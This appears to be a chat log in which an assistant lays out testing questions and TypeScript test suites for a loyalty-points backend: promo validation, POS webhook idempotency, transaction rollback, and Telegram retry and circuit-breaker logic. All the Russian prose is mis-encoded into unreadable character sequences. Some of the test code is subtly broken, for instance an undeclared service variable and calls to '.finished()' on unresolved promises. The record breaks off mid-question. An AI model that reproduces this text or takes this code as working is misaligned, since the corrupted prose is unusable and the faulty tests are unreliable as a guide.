**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –≤–∞–ª–∏–¥–∏—Ä—É–µ–º –≤ unit tests?

- A) –¢–æ–ª—å–∫–æ required fields (name, start date, end date)
- B) Business rules: start < end, –Ω–µ –ø–µ—Ä–µ—Å–µ–∫–∞–µ—Ç—Å—è —Å –¥—Ä—É–≥–∏–º–∏ promo
- C) Complex conditions: –¥–µ–Ω—å –Ω–µ–¥–µ–ª–∏, –≤—Ä–µ–º—è, –º–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞
- D) B + C + simulate promo application (dry-run)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Required fields = –±–∞–∑–æ–≤–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è (–Ω–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ)
- Business rules –∫—Ä–∏—Ç–∏—á–Ω—ã (promo –∫–æ–Ω—Ñ–ª–∏–∫—Ç = –ø–ª–æ—Ö–æ–π UX)
- Dry-run simulation –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç production bugs

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('PromoValidationService', () => {
  let service: PromoValidationService;

  // 1. Required Fields
  describe('required fields', () => {
    it('should reject promo without name', async () => {
      const promo = {
        // name: missing
        startDate: new Date(),
        endDate: addDays(new Date(), 7),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Name is required');
    });

    it('should reject promo without dates', async () => {
      const promo = {
        name: 'Black Friday',
        // startDate: missing
        // endDate: missing
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Start date is required');
      expect(result.errors).toContain('End date is required');
    });
  });

  // 2. Business Rules
  describe('business rules', () => {
    it('should reject if startDate >= endDate', async () => {
      const promo = {
        name: 'Invalid Promo',
        startDate: new Date('2026-02-20'),
        endDate: new Date('2026-02-10'), // Before start!
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('End date must be after start date');
    });

    it('should reject if overlaps with existing promo', async () => {
      // Existing promo: 2026-02-10 to 2026-02-20
      await prisma.promo.create({
        data: {
          id: '1',
          name: 'Existing Promo',
          startDate: new Date('2026-02-10'),
          endDate: new Date('2026-02-20'),
          isActive: true,
        },
      });

      // New promo: 2026-02-15 to 2026-02-25 (overlaps!)
      const promo = {
        name: 'New Promo',
        startDate: new Date('2026-02-15'),
        endDate: new Date('2026-02-25'),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Promo overlaps with "Existing Promo"');
    });

    it('should allow adjacent promos (no overlap)', async () => {
      // Existing promo ends on 2026-02-20
      await prisma.promo.create({
        data: {
          id: '1',
          name: 'Existing Promo',
          startDate: new Date('2026-02-10'),
          endDate: new Date('2026-02-20'),
          isActive: true,
        },
      });

      // New promo starts on 2026-02-21 (no overlap)
      const promo = {
        name: 'New Promo',
        startDate: new Date('2026-02-21'),
        endDate: new Date('2026-02-28'),
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(true);
    });
  });

  // 3. Complex Conditions
  describe('complex conditions', () => {
    it('should validate day of week condition', async () => {
      const promo = {
        name: 'Friday Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          dayOfWeek: ['Friday', 'InvalidDay'], // Invalid!
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Invalid day of week: InvalidDay');
    });

    it('should validate time range condition', async () => {
      const promo = {
        name: 'Evening Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          timeRange: {
            start: '22:00',
            end: '18:00', // End before start!
          },
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Time range: end must be after start');
    });

    it('should validate minimum check amount', async () => {
      const promo = {
        name: 'Big Spender Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        conditions: {
          minCheckAmount: -100, // Negative!
        },
      };

      const result = await service.validatePromo(promo);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Minimum check amount must be positive');
    });
  });

  // 4. Dry-Run Simulation
  describe('dry-run simulation', () => {
    it('should simulate promo application', async () => {
      const promo = {
        name: 'Double Balls Friday',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        multiplier: 2,
        conditions: {
          dayOfWeek: ['Friday'],
          timeRange: { start: '18:00', end: '22:00' },
        },
      };

      // Dry-run: simulate transaction on Friday at 19:00
      const simulation = await service.simulatePromo(promo, {
        checkAmount: 2000,
        timestamp: new Date('2026-02-14T19:00:00'), // Friday 19:00
      });

      expect(simulation.matched).toBe(true);
      expect(simulation.ballsEarned).toBe(400); // 2000 * 10% * 2 = 400
    });

    it('should NOT match promo outside time range', async () => {
      const promo = {
        name: 'Evening Promo',
        startDate: new Date('2026-02-10'),
        endDate: new Date('2026-02-20'),
        multiplier: 2,
        conditions: {
          timeRange: { start: '18:00', end: '22:00' },
        },
      };

      // Simulate transaction at 12:00 (outside range)
      const simulation = await service.simulatePromo(promo, {
        checkAmount: 2000,
        timestamp: new Date('2026-02-14T12:00:00'),
      });

      expect(simulation.matched).toBe(false);
      expect(simulation.ballsEarned).toBe(200); // Normal: 2000 * 10% = 200
    });
  });
});
```


***

–•–æ—á–µ—à—å —á—Ç–æ–±—ã —è –ø—Ä–æ–¥–æ–ª–∂–∏–ª —Å **–æ—Å—Ç–∞–ª—å–Ω—ã–º–∏ 40 –≤–æ–ø—Ä–æ—Å–∞–º–∏** (Integration Testing, E2E, Load Testing, Security, Chaos)? üöÄ

---

# –ü—Ä–æ–¥–æ–ª–∂–∞–π

–ü—Ä–æ–¥–æ–ª–∂–∞—é! üöÄ

***

## **–ë–õ–û–ö 2: INTEGRATION TESTING (10 –≤–æ–ø—Ä–æ—Å–æ–≤)**


***

### **6. POS Webhook Processing - idempotency?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** POS –º–æ–∂–µ—Ç –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook **–¥–≤–∞–∂–¥—ã** –∏–∑-–∑–∞ network timeout.

```typescript
POST /webhooks/transaction
{
  "posCheckId": "CHK-123456",
  "checkAmount": 2850,
  "guestPhone": "+79991234567"
}
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å idempotency?

- A) –û—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —Ä–µ–∑—É–ª—å—Ç–∞—Ç
- B) –û—Ç–ø—Ä–∞–≤–∏—Ç—å –æ–¥–∏–Ω webhook **–¥–≤–∞–∂–¥—ã** ‚Üí –ø—Ä–æ–≤–µ—Ä–∏—Ç—å —á—Ç–æ –±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–∏–ª–∏—Å—å —Ç–æ–ª—å–∫–æ —Ä–∞–∑
- C) B + –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å —Ä–∞–∑–Ω–∏—Ü–µ–π –≤ 1 —Å–µ–∫—É–Ω–¥—É (–ø—Ä–æ–≤–µ—Ä–∏—Ç—å Redis TTL)
- D) C + –æ—Ç–ø—Ä–∞–≤–∏—Ç—å concurrent requests (10 –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ)

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Duplicate webhooks = REAL –ø—Ä–æ–∏–∑–≤–æ–¥—Å—Ç–≤–µ–Ω–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ (–ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç —Ä–µ–≥—É–ª—è—Ä–Ω–æ)
- Concurrent processing –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è high-load scenarios
- Redis TTL –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
// apps/backend/test/integration/pos-webhook-idempotency.spec.ts
describe('POS Webhook - Idempotency (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let redis: Redis;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    redis = app.get('REDIS');
  });

  beforeEach(async () => {
    // Clean database
    await prisma.ballTransaction.deleteMany();
    await prisma.posTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await redis.flushall();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
        phone: '+79991234567',
      },
    });
  });

  afterAll(async () => {
    await app.close();
  });

  // 1. Happy Path - Single Webhook
  it('should process webhook once successfully', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    const response = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    expect(response.body.success).toBe(true);

    // Check database
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-123456' },
    });
    expect(ballTx.amount).toBe(285); // 2850 * 10% = 285

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1285); // 1000 + 285
  });

  // 2. Duplicate Webhook - Same Request Twice
  it('should handle duplicate webhook (idempotent)', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    // Send duplicate webhook
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook)
      .expect(200);

    expect(response2.body.success).toBe(true);
    expect(response2.body.alreadyProcessed).toBe(true);

    // Check that balls credited ONLY ONCE
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-123456' },
    });
    expect(ballTransactions).toHaveLength(1);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1285); // NOT 1570!
  });

  // 3. Duplicate with 1 Second Delay (Redis TTL Check)
  it('should handle duplicate webhook after 1 second', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-123456',
      tenantId: 'tenant-1',
      checkAmount: 2850,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    // Wait 1 second
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Send duplicate webhook
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    expect(response2.body.alreadyProcessed).toBe(true);

    // Check Redis cache still active
    const cacheKey = `idempotency:tenant-1:IIKO_CLOUD:CHK-123456`;
    const cached = await redis.get(cacheKey);
    expect(cached).toBeTruthy();
  });

  // 4. Concurrent Webhooks (10 simultaneous)
  it('should handle 10 concurrent duplicate webhooks', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-CONCURRENT',
      tenantId: 'tenant-1',
      checkAmount: 5000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send 10 webhooks simultaneously
    const promises = Array(10).fill(null).map(() =>
      request(app.getHttpServer())
        .post('/webhooks/transaction')
        .send(webhook)
    );

    const responses = await Promise.all(promises);

    // All should succeed (HTTP 200)
    expect(responses.every(r => r.status === 200)).toBe(true);

    // But balls credited ONLY ONCE
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-CONCURRENT' },
    });
    expect(ballTransactions).toHaveLength(1);
    expect(ballTransactions[0].amount).toBe(500);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500); // 1000 + 500 (NOT 6000!)
  });

  // 5. Different posCheckId - Should Process Both
  it('should process webhooks with different posCheckId separately', async () => {
    const webhook1 = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-111',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    const webhook2 = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-222', // Different!
      tenantId: 'tenant-1',
      checkAmount: 2000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook1);
    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook2);

    // Both should be processed
    const ballTransactions = await prisma.ballTransaction.findMany();
    expect(ballTransactions).toHaveLength(2);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1300); // 1000 + 100 + 200
  });

  // 6. Redis Cache Expiration (after 24 hours)
  it('should allow reprocessing after cache expiration', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-EXPIRE',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send first webhook
    await request(app.getHttpServer()).post('/webhooks/transaction').send(webhook);

    // Manually expire Redis cache (simulate 24 hours)
    const cacheKey = `idempotency:tenant-1:IIKO_CLOUD:CHK-EXPIRE`;
    await redis.del(cacheKey);

    // Send webhook again (after cache expired)
    const response2 = await request(app.getHttpServer())
      .post('/webhooks/transaction')
      .send(webhook);

    // Should be processed as new (not duplicate)
    expect(response2.body.alreadyProcessed).toBeUndefined();

    // But database constraint should prevent duplicate
    const ballTransactions = await prisma.ballTransaction.findMany({
      where: { sourceId: 'CHK-EXPIRE' },
    });
    expect(ballTransactions).toHaveLength(1); // Still only 1 (DB constraint)
  });

  // 7. Distributed Lock Test (Redis)
  it('should use distributed lock to prevent race conditions', async () => {
    const webhook = {
      posSystem: 'IIKO_CLOUD',
      posCheckId: 'CHK-LOCK',
      tenantId: 'tenant-1',
      checkAmount: 1000,
      guestPhone: '+79991234567',
      timestamp: new Date().toISOString(),
    };

    // Send 5 concurrent webhooks
    const promises = Array(5).fill(null).map(() =>
      request(app.getHttpServer()).post('/webhooks/transaction').send(webhook)
    );

    await Promise.all(promises);

    // Check that lock was used (only 1 processed)
    const lockKey = `lock:guest:card-1`;
    const lockExists = await redis.exists(lockKey);
    expect(lockExists).toBe(0); // Lock released after processing
  });
});
```


***

### **7. Database Transactions - rollback –ø—Ä–∏ –æ—à–∏–±–∫–µ?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** –ù–∞—á–∏—Å–ª–µ–Ω–∏–µ –±–∞–ª–ª–æ–≤ = multi-step process:

1. Create BallTransaction
2. Update GuestCard balance
3. Create Notification
4. Log Audit

**–í–æ–ø—Ä–æ—Å:** –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –µ—Å–ª–∏ —à–∞–≥ 3 fail?

- A) Partial commit (–±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã, notification –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω) - ‚ùå BAD
- B) Full rollback (–Ω–∏—á–µ–≥–æ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–æ—Å—å) - ‚úÖ GOOD
- C) Retry step 3 –æ—Ç–¥–µ–ª—å–Ω–æ
- D) B + –∫–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å rollback –≤ integration tests?

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Partial commit = data inconsistency (–±–∞–ª–ª—ã –Ω–∞—á–∏—Å–ª–µ–Ω—ã, –Ω–æ notification –Ω–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω)
- Prisma `$transaction` –≥–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ—Ç atomicity
- Retry –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–∞ —É—Ä–æ–≤–Ω–µ queue (BullMQ), –Ω–µ –≤–Ω—É—Ç—Ä–∏ transaction

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Ball Crediting - Transaction Rollback (Integration)', () => {
  let app: INestApplication;
  let prisma: PrismaClient;
  let notificationService: NotificationService;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    prisma = app.get(PrismaClient);
    notificationService = app.get(NotificationService);
  });

  beforeEach(async () => {
    await prisma.ballTransaction.deleteMany();
    await prisma.guestCard.deleteMany();
    await prisma.auditLog.deleteMany();

    // Seed test data
    await prisma.guestCard.create({
      data: {
        id: 'card-1',
        userId: 'user-1',
        tenantId: 'tenant-1',
        totalBalance: 1000,
      },
    });
  });

  // 1. Happy Path - All Steps Succeed
  it('should commit all steps successfully', async () => {
    const result = await loyaltyService.creditBalls({
      guestCardId: 'card-1',
      amount: 500,
      source: 'POS_WEBHOOK',
      sourceId: 'CHK-123',
    });

    expect(result.success).toBe(true);

    // Check all steps completed
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-123' },
    });
    expect(ballTx.amount).toBe(500);

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500);

    const audit = await prisma.auditLog.findFirst({
      where: { action: 'BALLS_CREDITED' },
    });
    expect(audit).toBeTruthy();
  });

  // 2. Notification Failure - Should Rollback Everything
  it('should rollback if notification fails', async () => {
    // Mock notification failure
    jest.spyOn(notificationService, 'send').mockRejectedValue(new Error('Telegram API down'));

    await expect(
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-456',
      })
    ).rejects.toThrow('Telegram API down');

    // Check that NOTHING was committed
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-456' },
    });
    expect(ballTx).toBeNull(); // Rolled back!

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // Unchanged!

    const audit = await prisma.auditLog.findFirst({
      where: { action: 'BALLS_CREDITED', targetId: 'CHK-456' },
    });
    expect(audit).toBeNull(); // Rolled back!
  });

  // 3. Database Constraint Violation - Should Rollback
  it('should rollback if duplicate sourceId', async () => {
    // Create existing transaction
    await prisma.ballTransaction.create({
      data: {
        id: '1',
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-DUPLICATE',
        status: 'COMPLETED',
        earnedAt: new Date(),
      },
    });

    // Try to create duplicate
    await expect(
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 500,
        source: 'POS_WEBHOOK',
        sourceId: 'CHK-DUPLICATE', // Duplicate!
      })
    ).rejects.toThrow(/Unique constraint/);

    // Check balance unchanged
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // NOT 1500!
  });

  // 4. Concurrent Transactions - Isolation Level
  it('should handle concurrent balance updates correctly', async () => {
    // Run 5 concurrent credit operations
    const promises = Array(5).fill(null).map((_, i) =>
      loyaltyService.creditBalls({
        guestCardId: 'card-1',
        amount: 100,
        source: 'POS_WEBHOOK',
        sourceId: `CHK-${i}`,
      })
    );

    await Promise.all(promises);

    // Check final balance
    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1500); // 1000 + (5 * 100) = 1500
  });

  // 5. Partial Rollback - Nested Transactions
  it('should rollback nested transaction on failure', async () => {
    await prisma.$transaction(async (tx) => {
      // Step 1: Credit balls (succeeds)
      await tx.ballTransaction.create({
        data: {
          id: '1',
          guestCardId: 'card-1',
          amount: 500,
          source: 'POS_WEBHOOK',
          sourceId: 'CHK-NESTED',
          status: 'COMPLETED',
          earnedAt: new Date(),
        },
      });

      // Step 2: Update balance (succeeds)
      await tx.guestCard.update({
        where: { id: 'card-1' },
        data: { totalBalance: { increment: 500 } },
      });

      // Step 3: Create audit log (fails)
      throw new Error('Audit log failed');
    }).catch(() => {
      // Expected to fail
    });

    // Check that ALL steps rolled back
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-NESTED' },
    });
    expect(ballTx).toBeNull();

    const guestCard = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
    expect(guestCard.totalBalance).toBe(1000); // Unchanged!
  });

  // 6. Long-Running Transaction - Timeout
  it('should timeout long-running transaction', async () => {
    jest.setTimeout(10000);

    await expect(
      prisma.$transaction(
        async (tx) => {
          await tx.ballTransaction.create({
            data: {
              id: '1',
              guestCardId: 'card-1',
              amount: 500,
              source: 'POS_WEBHOOK',
              sourceId: 'CHK-TIMEOUT',
              status: 'COMPLETED',
              earnedAt: new Date(),
            },
          });

          // Simulate long operation (6 seconds)
          await new Promise(resolve => setTimeout(resolve, 6000));
        },
        {
          maxWait: 5000, // 5 second timeout
          timeout: 5000,
        }
      )
    ).rejects.toThrow(/Transaction timeout/);

    // Check rollback
    const ballTx = await prisma.ballTransaction.findFirst({
      where: { sourceId: 'CHK-TIMEOUT' },
    });
    expect(ballTx).toBeNull();
  });
});
```


***

### **8. External Service Failures - resilience?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** Telegram API –≤–µ—Ä–Ω—É–ª 503 Service Unavailable.

```typescript
// Send notification via Telegram
sendTelegramNotification(guestId: string, message: string)
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å retry logic?

- A) Mock Telegram API ‚Üí –≤—Å–µ–≥–¥–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç 503
- B) Mock ‚Üí –ø–µ—Ä–≤—ã–µ 2 –ø–æ–ø—ã—Ç–∫–∏ 503, —Ç—Ä–µ—Ç—å—è 200 OK
- C) B + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å exponential backoff delays
- D) C + –ø—Ä–æ–≤–µ—Ä–∏—Ç—å Dead Letter Queue (DLQ) –ø–æ—Å–ª–µ 3 failures

**–ú–û–ô –í–´–ë–û–†: D**

**–û–ë–û–°–ù–û–í–ê–ù–ò–ï:**

- Exponential backoff –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–∞–µ—Ç overwhelming external services
- DLQ –∫—Ä–∏—Ç–∏—á–µ–Ω –¥–ª—è manual retry failed notifications
- Circuit breaker –∑–∞—â–∏—â–∞–µ—Ç –æ—Ç cascade failures

**–†–ï–ê–õ–ò–ó–ê–¶–ò–Ø:**

```typescript
describe('Telegram Notification - Retry Logic (Integration)', () => {
  let app: INestApplication;
  let queue: Queue;
  let telegramService: TelegramService;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    queue = app.get('BullQueue_notifications');
    telegramService = app.get(TelegramService);
  });

  beforeEach(async () => {
    await queue.clean(0, 'completed');
    await queue.clean(0, 'failed');
  });

  // 1. Success on First Attempt
  it('should send notification successfully on first attempt', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockResolvedValue({ ok: true });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    });

    await job.finished();

    expect(telegramService.sendMessage).toHaveBeenCalledTimes(1);
    expect(job.returnvalue.success).toBe(true);
  });

  // 2. Retry on 503 Error
  it('should retry on 503 Service Unavailable', async () => {
    let attempts = 0;
    
    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      attempts++;
      if (attempts <= 2) {
        throw { response: { status: 503 } }; // Fail first 2 attempts
      }
      return { ok: true }; // Succeed on 3rd attempt
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    });

    await job.finished();

    expect(attempts).toBe(3); // 1 initial + 2 retries
    expect(job.returnvalue.success).toBe(true);
  });

  // 3. Exponential Backoff Delays
  it('should use exponential backoff between retries', async () => {
    const timestamps: number[] = [];

    jest.spyOn(telegramService, 'sendMessage').mockImplementation(async () => {
      timestamps.push(Date.now());
      
      if (timestamps.length <= 2) {
        throw { response: { status: 503 } };
      }
      return { ok: true };
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 3,
      backoff: {
        type: 'exponential',
        delay: 1000, // 1s, 2s, 4s
      },
    });

    await job.finished();

    // Check delays between attempts
    const delay1 = timestamps[1] - timestamps[0];
    const delay2 = timestamps[2] - timestamps[1];

    expect(delay1).toBeGreaterThanOrEqual(1000); // ~1s
    expect(delay1).toBeLessThan(1500);

    expect(delay2).toBeGreaterThanOrEqual(2000); // ~2s
    expect(delay2).toBeLessThan(3000);
  });

  // 4. Dead Letter Queue after Max Retries
  it('should move to DLQ after 3 failed attempts', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 3,
      backoff: { type: 'exponential', delay: 100 },
    });

    await expect(job.finished()).rejects.toThrow();

    // Check DLQ
    const dlqRecord = await prisma.notificationDLQ.findFirst({
      where: { recipientId: 'user-1' },
    });

    expect(dlqRecord).toBeTruthy();
    expect(dlqRecord.attempts).toBe(3);
    expect(dlqRecord.errorMessage).toContain('503');
    expect(dlqRecord.status).toBe('PENDING');
  });

  // 5. Circuit Breaker - Stop Sending After Many Failures
  it('should trigger circuit breaker after multiple failures', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });

    // Send 10 notifications (all will fail)
    const jobs = Array(10).fill(null).map((_, i) =>
      queue.add('send-telegram', {
        guestId: `user-${i}`,
        message: 'Test notification',
      }, {
        attempts: 1, // No retries for this test
      })
    );

    await Promise.allSettled(jobs.map(j => j.finished()));

    // Check circuit breaker state
    const circuitBreaker = app.get('TelegramCircuitBreaker');
    expect(circuitBreaker.isOpen()).toBe(true); // Circuit opened after 10 failures

    // Next job should fail immediately (circuit open)
    const job11 = await queue.add('send-telegram', {
      guestId: 'user-11',
      message: 'Test notification',
    });

    await expect(job11.finished()).rejects.toThrow('Circuit breaker is open');
    expect(telegramService.sendMessage).not.toHaveBeenCalledWith(
      expect.objectContaining({ guestId: 'user-11' })
    );
  });

  // 6. Fallback to SMS on Telegram Failure
  it('should fallback to SMS if Telegram fails', async () => {
    const smsService = app.get(SmsService);
    
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { status: 503 },
    });
    
    jest.spyOn(smsService, 'send').mockResolvedValue({ success: true });

    const job = await queue.add('send-notification', {
      guestId: 'user-1',
      phone: '+79991234567',
      message: 'Test notification',
      channels: ['TELEGRAM', 'SMS'], // Fallback chain
    }, {
      attempts: 1, // No retries, use fallback instead
    });

    await job.finished();

    // Telegram failed, SMS succeeded
    expect(telegramService.sendMessage).toHaveBeenCalledTimes(1);
    expect(smsService.send).toHaveBeenCalledTimes(1);
    expect(job.returnvalue.channel).toBe('SMS');
  });

  // 7. Rate Limiting - 429 Too Many Requests
  it('should handle 429 rate limit errors', async () => {
    jest.spyOn(telegramService, 'sendMessage').mockRejectedValue({
      response: { 
        status: 429,
        headers: { 'retry-after': '5' }, // Retry after 5 seconds
      },
    });

    const job = await queue.add('send-telegram', {
      guestId: 'user-1',
      message: 'Test notification',
    }, {
      attempts: 2,
    });

    await expect(job.finished()).rejects.toThrow();

    // Check that we waited 5 seconds before retry
    const retryDelay = job.opts.backoff.delay;
    expect(retryDelay).toBeGreaterThanOrEqual(5000);
  });
});
```


***

### **9. Concurrent Webhook Processing - race conditions?**

**–ö–æ–Ω—Ç–µ–∫—Å—Ç:** 2 POS —Ç–µ—Ä–º–∏–Ω–∞–ª–∞ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç webhooks –¥–ª—è –æ–¥–Ω–æ–≥–æ –≥–æ—Å—Ç—è.

```
Thread 1: Credit 100 balls (balance: 500 ‚Üí 600)
Thread 2: Credit 200 balls (balance: 500 ‚Üí 700) ‚ùå Wrong! Should be 800
```

**–í–æ–ø—Ä–æ—Å:** –ö–∞–∫ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å concurrent processing?

- A) Unit test —Å locks (optimistic/pessimistic locking)
- B) Integration test: –∑–∞–ø—É—Å—Ç–∏—Ç—å 10 webhooks –ø–∞—Ä–∞–ª–ª–µ–ª—å–Ω–æ
